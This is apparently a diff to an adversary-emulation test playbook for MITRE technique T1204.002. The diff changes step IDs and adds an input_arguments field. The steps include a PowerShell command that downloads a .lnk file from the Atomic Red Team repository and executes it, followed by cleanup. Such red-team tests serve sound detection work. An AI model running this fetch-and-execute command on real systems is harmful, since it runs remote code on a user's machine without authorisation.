@@ -7,7 +7,7 @@
   ],
   "steps": [
     {
-      "id": "49a893e5-88e0-4b8f-8258-db97d77840f7",
+      "id": "cb7c689e-d65e-4f4b-b99f-7a214e45ed2a",
       "type": "execute-command",
       "data": {
         "command": "Invoke-WebRequest -OutFile $env:Temp\\test10.lnk \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/bin/test10.lnk\"\n$file1 = \"$env:Temp\\test10.lnk\"\nStart-Process $file1\nStart-Sleep -s 10\ntaskkill /IM a.exe /F",
@@ -16,7 +16,7 @@
       "elevation_required": false
     },
     {
-      "id": "12e514f1-5f18-40e7-89d6-560067717d18",
+      "id": "5fe8fa26-a74a-4700-9674-1e647f9bc4b0",
       "type": "execute-command",
       "data": {
         "command": "$file1 = \"$env:Temp\\test10.lnk\"\n$file2 = \"$env:Temp\\a.exe\"\nRemove-Item $file1 -ErrorAction Ignore\nRemove-Item $file2 -ErrorAction Ignore",
@@ -27,18 +27,19 @@
   ],
   "flows": [
     {
-      "s": "49a893e5-88e0-4b8f-8258-db97d77840f7",
+      "s": "cb7c689e-d65e-4f4b-b99f-7a214e45ed2a",
       "p": "on-success",
-      "o": "12e514f1-5f18-40e7-89d6-560067717d18"
+      "o": "5fe8fa26-a74a-4700-9674-1e647f9bc4b0"
     },
     {
-      "s": "49a893e5-88e0-4b8f-8258-db97d77840f7",
+      "s": "cb7c689e-d65e-4f4b-b99f-7a214e45ed2a",
       "p": "on-failure",
-      "o": "12e514f1-5f18-40e7-89d6-560067717d18"
+      "o": "5fe8fa26-a74a-4700-9674-1e647f9bc4b0"
     }
   ],
   "tags": [
     "T1204",
     "T1204.002"
-  ]
+  ],
+  "input_arguments": null
 }
